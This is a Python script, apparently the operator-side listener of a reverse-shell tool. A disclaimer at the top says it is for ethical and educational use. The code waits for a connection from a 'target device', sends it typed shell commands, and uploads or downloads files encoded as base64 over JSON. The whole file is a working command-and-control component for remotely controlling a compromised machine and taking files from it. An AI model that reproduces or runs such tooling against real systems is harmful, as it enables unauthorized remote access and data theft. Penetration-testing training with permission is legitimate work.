# ===========================================
# WARNING:
# This script is intended for ethical and educational use only.
# It is designed for cybersecurity training, penetration testing with permission, or academic learning purposes.
# Unauthorized access or use of this code on systems without explicit permission is illegal and unethical.
# ===========================================


#This file must be in the main device


import socket
import sys
import json
import base64

class SocketListener:
    def __init__(self, ip, port):
        # Create a TCP socket to listen for incoming connections
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening for incoming connections...")
        
        # Accept a single connection and store it
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection established from " + str(my_address))

    def json_send(self, data):
        # Encode and send data as JSON over the socket
        json_data = json.dumps(data)
        self.my_connection.send(json_data.encode())

    def json_receive(self):
        # Receive and decode JSON data from the socket
        json_data = b""
        while True:
            try:
                json_data += self.my_connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                # Incomplete JSON data, continue receiving
                continue

    @staticmethod
    def raw_input(prompt=""):
        # Get user input from the terminal (compatible with Python 2 style)
        sys.stdout.write(prompt)
        sys.stdout.flush()
        return sys.stdin.readline().rstrip('\n')

    def command_execution(self, command_input):
        # Send a command to the target device and receive the result
        self.json_send(command_input)

        if command_input[0] == "quit":
            # Close the connection if 'quit' command is issued
            self.my_connection.close()
            exit()

        return self.json_receive()

    def save_file(self, path, content):
        # Decode base64 content and save it as a file
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return "Download OK"

    def get_file_content(self, path):
        # Read a file and return its base64-encoded content
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def start_listener(self):
        # Main loop: continuously prompt for commands and process them
        while True:
            command_input = self.raw_input("Enter command: ")
            command_input = command_input.split(" ")

            try:
                if command_input[0] == "upload":
                    # If uploading a file, read and append its contents
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)

                # Execute the command and get output
                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error!" not in command_output:
                    # If downloading, save the file locally
                    command_output = self.save_file(command_input[1], command_output)

            except Exception:
                command_output = "Error!"

            print(command_output)

# Start the listener with the specified IP and port
# Replace the IP and port below with your actual listener IP and port
my_socket_listener = SocketListener("your_ip_address", "int type port number")
my_socket_listener.start_listener()